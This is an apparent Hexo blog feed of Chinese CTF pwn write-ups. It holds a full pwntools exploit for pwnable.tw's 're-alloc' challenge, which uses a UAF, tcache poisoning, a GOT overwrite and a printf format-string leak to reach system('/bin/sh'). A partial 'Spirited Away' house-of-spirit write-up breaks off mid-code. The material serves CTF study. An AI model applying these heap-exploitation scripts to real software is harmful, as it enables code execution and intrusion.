    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Input password</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="75bb8c3c6c62ebf7ae6dd56d2221023724b05b0017bd004ae426daef448d0a4a"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn heap: re-alloc</title>
    <url>/2020/03/06/pwn-heap-re-alloc/</url>
    <content><![CDATA[<p>这道题的总体思路就是uaf + fsb， 开始以为是libc2.29的uaf + tcache double free， 后来发现没有show导致没有办法leak出libc地址，最后无从下手。后来还是从别人的博客里学到神奇的姿势。</p>
<a id="more"></a>

<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>pwnable.tw上的一道题。<br><br>Partial RELRO，got表可以改，基本上是利用改got表来getshell了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>题目提供了四个功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. alloc</span><br><span class="line">2. realloc</span><br><span class="line">3. free</span><br><span class="line">4. exit</span><br></pre></td></tr></table></figure>
<p>其中alloc功能相当于malloc一个chunk，但是chunk的<code>size&lt;=0x78</code>, 且chunk的地址会放在bss段的heap数组上，heap数组允许至多两个成员。接受完data输入后会在末尾补上0，这里存在一个off by null，但是没有什么用。<br><br>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。<br><br>free功能就是同时free掉chunk以及将heap数组中的指针清0</p>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="libc2-29的tcache-double-free的检测机制"><a href="#libc2-29的tcache-double-free的检测机制" class="headerlink" title="libc2.29的tcache double free的检测机制"></a>libc2.29的tcache double free的检测机制</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>多了一个<code>key</code>的成员变量。这个<code>key</code>的作用是什么？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;	<span class="comment">//new</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;	<span class="comment">//new</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当chunk被free到tcache中时，<code>key</code>会被置为第一个chunk的地址，也就是tcache的结构chunk。当chunk从tcache中取出来时，<code>key</code>会被设置成NULL。总而言之，就是通过<code>key</code>来表明这个chunk是否在tcache中。<br><br>而这个<code>key</code>也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的<code>key</code>是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。<br><br>然而仍然有绕过检查的方法，就是<code>key</code>不等于tcache结构体的位置即可，而这往往需要配合uaf或者chunk overlap同时利用才能做到。</p>
<h2 id="realloc-ptr-size-函数"><a href="#realloc-ptr-size-函数" class="headerlink" title="realloc(ptr, size)函数"></a>realloc(ptr, size)函数</h2><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p>
<ol>
<li><code>ptr == 0</code>: malloc(size)</li>
<li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li>
<li><code>ptr != 0 &amp;&amp; size == old_size</code>: edit(ptr)</li>
<li><code>ptr != 0 &amp;&amp; size &lt; old_size</code>: edit(ptr) and free(remainder)</li>
<li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;</li>
</ol>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
<li>利用uaf在tcache不同size的链表中放置一个<code>atoll_got</code>的chunk</li>
<li>利用其中一个指向<code>atoll_got</code>的chunk更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak<code>__libc_start_main</code>。</li>
<li>利用另一个指向<code>atoll_got</code>的chunk将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。<del>由于read的长度限制在16，因此注意这里tcache的相关chunk必须是<code>size=0x20</code>，否则无法利用。</del>（可以通过”%xc”来控制printf的返回值。）</li>
<li>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system(&quot;/bin/sh&quot;);</code>getshell即可。</li>
</ul>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">bss = elf.bss(<span class="number">0</span>)</span><br><span class="line">atoll_got = elf.got[<span class="string">"atoll"</span>]</span><br><span class="line">atoll_plt = elf.plt[<span class="string">"atoll"</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">"printf"</span>]</span><br><span class="line">libc_start_main_ret_offset = libc.symbols[<span class="string">"__libc_start_main"</span>] + <span class="number">0xeb</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># let tcache[0x20] =&gt; atoll_got</span></span><br><span class="line"><span class="comment"># heap[0] ==&gt; chunk(0x18) &lt;== heap[1]</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"AAA"</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now heap[0] == heap[1] == NULL</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"CCC"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># let tcache[0x50] =&gt; atoll_got</span></span><br><span class="line"><span class="comment"># heap[0] ==&gt; chunk(0x18) &lt;== heap[1]</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"AAA"</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x48</span>, p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">"BBB"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now heap[0] == heap[1] == NULL</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"CCC"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">"D"</span> * <span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># above all, we get two tcache point to atoll_got that can be malloc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc once at heap[0]</span></span><br><span class="line"><span class="comment"># change the atoll_got to printf_plt</span></span><br><span class="line"><span class="comment"># use format string bug to leak the __libc_start_main_ret in the stack</span></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x48</span>, p64(printf_plt))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"%21$llx"</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_ret = int(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = libc_start_main_ret - libc_start_main_ret_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc twice at heap[1]</span></span><br><span class="line"><span class="comment"># since the atoll has been set to printf</span></span><br><span class="line"><span class="comment"># the return value of printf(which may be the length of the string) will be regarded as the "Index"</span></span><br><span class="line"><span class="comment"># thus we use length of the string to make "atoll" work</span></span><br><span class="line"><span class="comment"># then we change the atoll_got to libc_system</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"A\x00"</span>)</span><br><span class="line">p.sendafter(<span class="string">"Size:"</span>, <span class="string">"A"</span> * <span class="number">15</span> + <span class="string">"\x00"</span>)</span><br><span class="line">p.sendafter(<span class="string">"Data:"</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># input "/bin/sh\x00" and call system(atoll) to get shell</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_start_main_ret: "</span> + hex(libc_start_main_ret))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>将<code>atoll</code>改为<code>printf</code>确实是神奇的姿势（我没遇到过），从这个思路上看，貌似还可以引入本来不存在的漏洞来利用。</li>
<li>调试的时候gef好像有点问题，peda可以用。</li>
</ul>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.anquanke.com/post/id/194960" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194960</a></li>
<li><a href="https://tiencong283.ninja/post/realloc-pwnable-tw" target="_blank" rel="noopener">https://tiencong283.ninja/post/realloc-pwnable-tw</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>关于TEE的一些预备知识</title>
    <url>/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Input password</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="36ed822178fd10bf0bcaa25b56031ad8d3e5a18b494f750be8267d36b1933fc2"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>LearningNotes</category>
      </categories>
      <tags>
        <tag>TrustZone</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn heap: Spirited Away</title>
    <url>/2020/04/08/pwn-heap-Spirited-Away/</url>
    <content><![CDATA[<p>House of spirit attack，题目名字说明了一切。</p>
<a id="more"></a>

<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>32位程序，基本没开啥保护。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>就一个评论功能：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1; <span class="comment">// [sp+10h] [bp-E8h]@2</span></span><br><span class="line">    <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+48h] [bp-B0h]@1</span></span><br><span class="line">    <span class="keyword">size_t</span> v3; <span class="comment">// [sp+4Ch] [bp-ACh]@1</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [sp+50h] [bp-A8h]@2</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// [sp+A0h] [bp-58h]@2</span></span><br><span class="line">    <span class="keyword">void</span> *buf; <span class="comment">// [sp+A4h] [bp-54h]@2</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [sp+A8h] [bp-50h]@2</span></span><br><span class="line"></span><br><span class="line">    nbytes = <span class="number">0x3C</span>;</span><br><span class="line">    v3 = <span class="number">0x50</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x3C</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;v7, v3);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line">    ++cnt;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;v7);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;v1);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"200 comments is enough!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="string">'Y'</span> || choice == <span class="string">'y'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(buf);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="string">'N'</span> || choice == <span class="string">'n'</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Wrong choice."</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">    <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依次输入<code>name</code>, <code>age</code>, <code>reason</code>, <code>comment</code>然后会依次输出，并且会把字符串”%d comment so far. We will review them as soon as we can”放在v1里面，如果继续评论的话，<code>buf</code>会先<code>free</code>然后再重新<code>malloc</code>。</p>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="House-of-spirit-攻击原理"><a href="#House-of-spirit-攻击原理" class="headerlink" title="House of spirit 攻击原理"></a>House of spirit 攻击原理</h2><p>House of spirit是fastbin attack中的一种，主要是free出一个目标地址的fastbin出来，然后再malloc从而达到任意地址写的目的。<br><br>需要绕过的一些检测：</p>
<ul>
<li><code>fake chunk</code>的<code>ISMMAP</code>位(size的第2个bit）不能为1，因为free时，如果是<code>mmap</code>的chunk，会单独处理。  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>fake chunk</code>地址需要对齐<code>MALLOC_ALIGN_MASK</code>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -<span class="built_in">size</span>, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>fake chunk</code>的<code>size</code>大小需要满足对应的fastbin的需求，同时也得对齐。  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">size</span> &lt; MINSIZE || !aligned_OK (<span class="built_in">size</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>fake chunk</code>的<code>next chunk</code>的大小不能小于<code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code>。  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">    of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">    after getting the lock.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock || </span><br><span class="line">        (&#123; </span><br><span class="line">            assert (locked == <span class="number">0</span>); </span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset (p, <span class="built_in">size</span>)-&gt;<span class="built_in">size</span> &lt;= <span class="number">2</span> * SIZE_SZ || chunksize (chunk_at_offset (p, <span class="built_in">size</span>)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>fake chunk</code>对应的fastbin链表头部不能是该<code>fake chunk</code>，即不能构成double free的情况。  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">    (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">    size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">    only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">    deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old;</span><br><span class="line">&#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul>
<li>乍一眼看过去好像没什么洞，发现问题出在<code>sprintf</code>中，<code>v1</code>分配的大小是0x38，当<code>cnt</code>是两位数的时候，字符串长度正好是0x38，导致<code>nbytes</code>被覆盖为0，那么只要cnt为三位数，就可以将<code>cnt</code>覆盖为<code>ord(&#39;n&#39;)=0x6e</code>：  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> v1; <span class="comment">// [sp+10h] [bp-E8h]@2</span></span><br><span class="line"><span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+48h] [bp-B0h]@1</span></span><br><span class="line"><span class="keyword">size_t</span> v3; <span class="comment">// [sp+4Ch] [bp-ACh]@1</span></span><br><span class="line"><span class="keyword">char</span> s; <span class="comment">// [sp+50h] [bp-A8h]@2</span></span><br><span class="line"><span class="keyword">int</span> v5; <span class="comment">// [sp+A0h] [bp-58h]@2</span></span><br><span class="line"><span class="keyword">void</span> *buf; <span class="comment">// [sp+A4h] [bp-54h]@2</span></span><br><span class="line"><span class="keyword">int</span> v7; <span class="comment">// [sp+A8h] [bp-50h]@2</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, 